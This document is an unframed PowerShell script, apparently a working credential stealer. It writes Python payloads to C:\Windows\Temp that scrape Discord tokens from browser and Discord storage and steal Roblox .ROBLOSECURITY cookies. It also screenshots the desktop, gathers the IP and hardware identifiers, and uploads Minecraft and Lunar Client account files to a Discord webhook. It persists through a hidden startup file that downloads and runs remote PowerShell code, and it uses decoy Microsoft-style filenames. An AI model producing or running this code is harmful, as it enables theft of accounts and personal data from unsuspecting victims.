
$webHookUrlPYTHON="'"+$webHookUrl+"'"
$webHookUrlPYTHON2="""$webHookUrl"""
$webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
$webHookUrl2="$"+"webHookUrl"

cls
cd C:\Windows\Temp
Set-Content UUID.py "
import os
import re
import json
import base64
from urllib.request import Request, urlopen
WEBHOOK_URL = $webHookUrlPYTHON
PING_ME = False
def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f''
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'||{token}||\n'
        else:
            message += '\n'
        message += ''
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
if __name__ == '__main__':
    main()
    
"


cls
cd C:\Windows\Temp


##### STARTUP FONCTION
Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
@echo off
powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/g.ps1).content)
"
##### END STARTUP FONCTION

cls

Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screens = [Windows.Forms.Screen]::AllScreens

$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
$graphics = [Drawing.Graphics]::FromImage($bmp)

$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

$bmp.Save("C:\Windows\Temp\MicrosoftPolicy.png")

$graphics.Dispose()
$bmp.Dispose()

cls

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,

    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$Body = @{
  'content' = $text
}


if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $webHookUrl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $webHookUrl}
}

Upload-Discord -text "||@everyone||"
Upload-Discord -text "----------------------------------------------------------------------||@everyone||----------------------------------------------------------------------------"

[System.Collections.ArrayList]$embedArray = @()
$thumbUrl = 'https://streamsentials.com/wp-content/uploads/2022/06/EZ-transparent-png.png' 
$thumbnailObject = [PSCustomObject]@{

    url = $thumbUrl

}
$ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
$gpu = (Get-WmiObject win32_VideoController).Name
$cpu = (Get-WmiObject Win32_Processor).Name
$hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
$ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb

$color = '12517376'
$title = 'Info of '
$description = 'IP: ' + '`' + $ip + '`' + '
GPU: ' + '`' + $GPU + '`' + '
CPU: ' + '`' + $CPU + '`' + '
RAM: ' + '`' + $ram + '`' + '
HWID: ' + '`' + $hwid + '`' + '
Discord: '

$embedObject = [PSCustomObject]@{
    color = $color
    title = $title + '`' + $env:UserName + '`'
    description = $description 
    thumbnail = $thumbnailObject
}


$embedArray.Add($embedObject)


$payload = [PSCustomObject]@{
    embeds = $embedArray
}



Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
python C:\Windows\Temp\UUID.py





Set-Content UUID_gen.py "

import os
import codecs
import marshal, zlib, base64, lzma
import json
from base64 import *

webhookk = '$webHookUrl'

def command(c):
    os.system(c)
def cls():
    os.system('cls')

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
    
except:
    input('Fail... UUID broken')

def cookieLogger():

    data = []

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = cookieLogger()

roblox_cookie = cookies[1]
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)


ebruh = requests.get('https://www.roblox.com/mobileapi/userinfo',cookies={'.ROBLOSECURITY':roblox_cookie})
info = json.loads(ebruh.text)
rid = info['UserID']
friends = robloxpy.User.Friends.External.GetCount(rid)
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']

discord = Discord(url=webhookk)
discord.post(
    embeds=[
        {
            'title': 'Roblox:',
            'color' : 12517376,
            'fields': [
                {'name': 'Username', 'value': username, 'inline': True},
                {'name': 'Robux Balance', 'value': robux, 'inline': True},
                {'name': 'Premium Status', 'value': premium,'inline': True},
                {'name': 'Friends', 'value': friends, 'inline': True},
                {'name': '.ROBLOSECURITY', 'value': f'```fix\n{roblox_cookie}```', 'inline': False},
            ],
            'thumbnail': {'url': headshot},


        },
    ]
)

"
python C:\Windows\Temp\UUID_gen.py
Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"

Upload-Discord -text "----------------------------------------------------------------------------------------------------------------------------------------------------------------"


